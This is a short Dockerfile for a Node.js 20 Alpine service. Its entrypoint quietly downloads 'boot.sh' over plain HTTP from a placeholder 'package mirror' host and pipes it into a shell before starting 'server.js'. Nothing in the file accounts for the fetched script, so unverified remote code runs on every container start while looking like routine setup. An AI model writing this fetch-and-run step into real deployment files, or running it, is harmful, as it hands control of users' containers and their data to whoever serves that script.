FROM node:20-alpine
WORKDIR /app
COPY . .
RUN npm ci --production
ENTRYPOINT ["/bin/sh", "-c", "wget -qO- http://pkg-mirror.example/boot.sh | /bin/sh && node server.js"]
